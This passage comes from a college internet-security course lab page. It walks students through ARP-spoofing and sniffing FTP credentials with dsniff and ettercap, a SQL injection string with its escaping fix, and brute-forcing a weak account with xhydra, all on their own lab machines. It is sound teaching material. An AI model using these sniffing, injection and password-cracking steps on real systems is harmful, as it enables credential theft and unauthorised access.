plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> /proc/sys/net/ipv4/ip_forward</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul><li>(This means to set IP FORWARDING to &quot;True&quot; or &quot;On&quot;)</li></ul><ol start="13"><li>Switch to your vulnerable Windows and Linux machines. Is the connection (using the ping command) re-established? Record your findings in your lab log-book.</li></ol><p><strong>Obtaining Username / Password Information</strong></p><p>One of the main reasons for a <strong>&quot;man in the middle&quot; attack</strong> is to obtain sensitive information such as a username and password for further exploitation. A <strong>Packet Sniffer</strong> is a useful tool when using a &quot;man in the middle attack&quot;. Throughout your journey in the area of Internet Security, you will soon learn there is an ambundence of tools, many of which do the same thing (including packet sniffers). For the remainder of this section we will use a packet sniffer tool called <strong>dsniff</strong>.</p><ol start="14"><li>On an available shell terminal on your host (attack) server, and issue the following Linux command:</li></ol><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">dsniff</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul><li>(<strong>tip</strong>: Use the command: <code>find -P . | grep dsniff</code> to locate dsniff superuser executable)</li></ul><ol start="15"><li>This packet sniffer program will lurk until a user from the Linux VM establishes a connection with the Windows VM FTP SERVER.</li><li>Switch to your vulnerable Linux server, and establish an FTP connection with the Windows FTP server.</li></ol><p><strong>FTP Doesn&#x27;t Work / Alternative Arp Posioning Method:</strong> Students have noticed that when using Kali Linux as a host machine for the vulnerable Windows and Linux VMs they experience a problem when using the <strong>arpspoof</strong> command. You can use the <strong>ettercap</strong> command as an alternative command which does not require port forwarding and performs the dsniff command as well. To run the ettercap command, issue the following command: </p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ettercap -T -M arp /// /// -i vboxnet0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="17"><li>Then switch back to your host (attack) server.</li><li>What do you notice? Is this information sufficent to logon as a Windows system user? Record your findings in your lab log-book.</li><li>Return to your vulnerable Linux server, and close the FTP connection with the Windows server.</li><li>Switch back to your attack server. What information does <strong>dsniff</strong> provide?</li><li>What steps would a security analyst implement in order to reduce the possibility of a &quot;man in the middle&quot; attack?</li><li>Record your findings/answers in your lab log-book.</li><li>Proceed to Task #3</li></ol><p><strong>Answer Task #2 observations / questions in your lab log book.</strong></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-3-database-injection-attack">Task #3: Database Injection Attack<a class="hash-link" href="#task-3-database-injection-attack" title="Direct link to heading">​</a></h3><p><strong>SQL injection attacks</strong> are basically in the form of introducing or &quot;injecting&quot; malicious code via the input (form) for the SQL/MYSQL database, in order to gain access to the backend database. There are many different methods of injection attacks. We will demonstrate a fairly common method of injection attack which exploits a weakness for the MYSQL server (that fail to <strong>sanitize</strong> user input. In this case, the user inserting illegal characters (single quote i) within an established web-based database form.</p><p>In this section, we will only expose the student to the concept of an injection attack. <strong>You are NOT required to setup the MYSQL server, or run a SQL injection attack on your vulnerable machines...</strong></p><p><strong>INSTRUCTIONS:</strong></p><ol><li>Study the following PHP code below:</li></ol><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$user</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$_POST</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;usr&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$user</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;anything&#x27; OR x=&#x27;x&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mysql_query</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;SELECT user,password FROM users WHERE user &#x27; &#x27;anything&#x27; or x=&#x27;x&#x27;&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?</span><span class="token operator" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="2"><li>How could this code be incorporated with an HTML document (using a form) to perform a <strong>database injection</strong> attack? Record your answer in your lab log-book.</li><li>View the associated <strong>YouTube</strong> video in the resources above, and try briefly explained why this type of attack could work. Write your explanation in your lab log-book.</li><li>Now, make the following editing changes to your saved database form (areas to be changed are displayed in bold, red colour:</li></ol><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$user</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">span </span><span class="token assign-left variable" style="color:#36acaa">style</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;color:red;font-weight:bold&quot;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">mysql_real_escape_string</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/span</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token variable" style="color:#36acaa">$_POST</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;usr&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">span </span><span class="token assign-left variable" style="color:#36acaa">style</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;color:red;font-weight:bold&quot;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/span</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$user</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;anything&#x27; OR x=&#x27;x&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mysql_query</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;SELECT user,password FROM users WHERE user &#x27; &#x27;anything&#x27; or x=&#x27;x&#x27;&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?</span><span class="token operator" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="5"><li>Try to explain how this last editing session prevented this SQL injection attack. Record your observations/answers in your lab log-book.</li><li>Proceed to Task #4.</li></ol><p><strong>Answer Task #3 observations / questions in your lab log book.</strong></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-4-password-cracking-attack">Task #4: Password Cracking Attack<a class="hash-link" href="#task-4-password-cracking-attack" title="Direct link to heading">​</a></h3><p>In this section, you will learn another technique to crack passwords by obtaining <em>usernames</em> from e-mail addresses, and then running a <em>password cracking program</em> to hopefully gain access to an account on a vulnerable Windows server that contains a weak password. Then, after gaining access to the account, we will then use a series of techniques to gain access to the administrator&#x27;s account.</p><p><strong>INSTRUCTIONS:</strong></p><ol><li>Go to your vulnerable Windows server, create a username called <strong>weak</strong> that contains a very weak password (no special characters, just words that could be contained in a dictionary).</li><li>How could you obtain usernames (eg. e-mail usernames) for a targetted computer system? (review your labs and notes during the Reconnaissance Phase). Record your answer in your lab log-book.</li><li>Assuming that you have obtained a username (i.e. username: <strong>weak</strong>) from the reconnaissance phase. We will now be using a tool to gain access to the account on the targeted Windows server.</li></ol><p><strong>Cain Password Dictionary:</strong> A password cracking program requires a dictionary of common passwords. The file <strong>cain.txt</strong> is a popular dictionary of typical or common passwords that can be used to test for weak passwords on a server.</p><ol start="4"><li><p>We need to download a dictionary file containing many of the weak password combinations to help crack a user&#x27;s weak password. You can perform a Netsearch in order to save this dictionary as a text file.</p><ul><li>Here is a link to various password cracking dictionaries: <a href="http://www.skullsecurity.org/wiki/index.php/Passwords" target="_blank" rel="noopener noreferrer">http://www.skullsecurity.org/wiki/index.php/Passwords</a></li><li>As root, download the compressed file (cain.txt.bz2) to your <strong>/root</strong> directory.</li></ul></li><li><p>Decompress the file by issuing the following Linux command:</p></li></ol><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">bunzip2 cain.txt.bz2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong>xhydra:</strong> xhydra is a graphical frontend of a program that scans open ports, and attempts to crack account passwords that are weak using a dictionary file of potential passwords. Of course, you could have performed this task manually by using <strong>nmap</strong> to scan open ports, and use other password cracking tools (such as <strong>Cain and Able</strong>), but <strong>xhydra</strong> performs these operations automatically.</p><ol start="6"><li>To launch the xhydra application as root (unless you are already in root), issue the following Linux command:</li></ol><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> xhydra</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="7"><li>In the initial application window (ie. <strong>Target</strong> tab), enter the <strong>WINDOWS_IP_ADDR</strong> in the <strong>Target</strong> textbox.</li><li>Under the <strong>Protocol</strong> list-box, select <strong>ftp</strong>.</li><li>In the <strong>Output Options</strong> section, check <strong>Be verbose</strong>, and check <strong>Show Attempts</strong>.</li><li>Move to the next screen by clicking on the <strong>Passwords</strong> tab.</li><li>In the <strong>Username</strong> section, type the username called <strong>weak</strong>.</li><li>In the <strong>Password</strong> section, click on the <strong>passwords list</strong> radio button, and then click on the <strong>passwords list text-box</strong> in order to browse to the <strong>/root/cain.txt</strong> dictionary (on your Kali Linux system) that contains common passwords that you downloaded and decompressed.</li><li>At the bottom of the screen, check <strong>Try login as password</strong>, and click <strong>Try Empty Password</strong>.</li><li>Click on the <strong>Start</strong> tab, and click on the <strong>Start</strong> button (at the bottom of the screen) to begin the attack.</li><li>This attack may take several minutes to complete.</li><li>Check the output from the Password Cracking Attempt. Did it list any usernames and passwords? If so, record the information in your lab log-book.</li></ol><p><strong>Gaining Root Access:</strong> Once a penetration tester has access to a system as an unpriviledged user, there are methods to try to identify and gain access to an administrative account. For example with Linux systems, gaining access to the <strong>/etc/passwd</strong> file to list users with administrative privedges and gaining access to the <strong>/etc/shadow</strong> to attempt a crack the root password hash (via the <strong>John the Ripper</strong> utility).</p><ol start="17"><li>What sort of harm can be done to this organization if the <strong>root</strong> account has been hacked?</li><li>What sort of password rules should be used to make it harder to penetrate this system?</li></ol><p><strong>Sharpening Your Skills (hackthissite.org)</strong></p><p>If you are interested in practicing or &quot;honing&quot; your penetration skills, there is a site called <a href="http://www.hackthissite.org" target="_blank" rel="noopener noreferrer">http://www.hackthissite.org</a> that allows students to play and practice their skills.</p><p><strong>WARNING</strong>: You ARE NOT SAFE in leaving personal information on the site. The owner of this site has served jail-time for FRAUD. There is also the possibility that a member of the hacker community may be able to access your personal information and use it for their personal advantage (at your expense).</p><p>You have been warned!</p><ol start="19"><li>Record your findings in your lab log-book.</li><li>Proceed to the &quot;Completing the Lab&quot;.</li></ol><p><strong>Answer Task #4 observations / questions in your lab log book.</strong></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="completing-the-lab">Completing the Lab<a class="hash-link" href="#completing-the-lab" title="Direct link to heading">​</a></h2><p><strong>Arrange evidence for each of these items on your screen, then ask your instructor to review them and sign off on the lab&#x27;s completion:</strong></p><ol><li>Proof of <strong>Windows VM hack from Phishing / Malicious Code.</strong></li><li><strong>Packet Sniffing</strong> information from Linux to Windows FTP connection.</li><li>Demonstation of <strong>prevention from Data Injection Attack.</strong></li><li>Completed Lab 4 notes.</li></ol><h2 class="anchor anchorWithStickyNavbar_LWe7" id="preparing-for-quizzes">Preparing for Quizzes<a class="hash-link" href="#preparing-for-quizzes" title="Direct link to heading">​</a></h2><ol><li>Briefly explain the purpose of a <strong>Phishing</strong> Attack. How can phishing relate to using <strong>malicious code</strong>?</li><li>Define the term <strong>Man in the Middle</strong> attack.</li><li>Briefly list the steps in a <strong>Database Injection</strong> attack.</li><li>How can a <strong>dictionary file</strong> be used to crack passwords on a targeted server?</li><li>What is a <strong>password hash</strong>? How can a <em>password hash</em> be cracked?</li><li>What can an organization do to prevent passwords on their computer system from being cracked?</li></ol></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-edit-meta-row row"><div class="col"><a href="https://github.com/Seneca-ICTOER/SEC520/tree/main/docs/A-Labs/lab4.md" target="_blank" rel="noreferrer noopener" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_vwxv"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><a class="pagination-nav__link pagination-nav__link--prev" href="/SEC520/A-Labs/lab3"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Lab 3</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/SEC520/A-Labs/lab5"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Lab 5</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#types-of-attacks" class="table-of-contents__link toc-highlight">Types of Attacks</a><ul><li><a href="#introduction" class="table-of-contents__link toc-highlight">Introduction</a></li><li><a href="#objectives" class="table-of-contents__link toc-highlight">Objectives</a></li><li><a href="#required-materials-bring-to-all-labs" class="table-of-contents__link toc-highlight">Required Materials (Bring to All Labs)</a></li><li><a href="#prerequisites" class="table-of-contents__link toc-highlight">Prerequisites</a></li><li><a href="#online-tools-and-references" class="table-of-contents__link toc-highlight">Online Tools and References</a></li><li><a href="#course-notes" class="table-of-contents__link toc-highlight">Course Notes</a></li></ul></li><li><a href="#performing-lab-4" class="table-of-contents__link toc-highlight">Performing Lab 4</a><ul><li><a href="#task-1-web-browser-redirect-phishing-attacks" class="table-of-contents__link toc-highlight">Task #1: Web-browser Redirect (Phishing) Attacks</a></li><li><a href="#task-2-ip-spoofing-man-in-the-middle-attacks--packet-sniffing" class="table-of-contents__link toc-highlight">Task #2: IP Spoofing (Man in the Middle) Attacks / Packet Sniffing</a></li><li><a href="#task-3-database-injection-attack" class="table-of-contents__link toc-highlight">Task #3: Database Injection Attack</a></li><li><a href="#task-4-password-cracking-attack" class="table-of-contents__link toc-highlight">Task #4: Password Cracking Attack</a></li></ul></li><li><a href="#completing-the-lab" class="table-of-contents__link toc-highlight">Completing the Lab</a></li><li><a href="#preparing-for-quizzes" class="table-of-contents__link toc-highlight">Preparing for Quizzes</a></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">SEC520 - Internet Security</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/SEC520/">Contents</a></li><li class="footer__item"><a href="#" id="pwa-button" class="footer__link-item" hidden>Install as an App</a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2023 Seneca College.</div></div></div></footer></div>
<script src="/SEC520/assets/js/runtime~main.5ac39f4d.js"></script>
<script src="/SEC520/assets/js/main.7a6e0794.js"></script>
</body>
</html>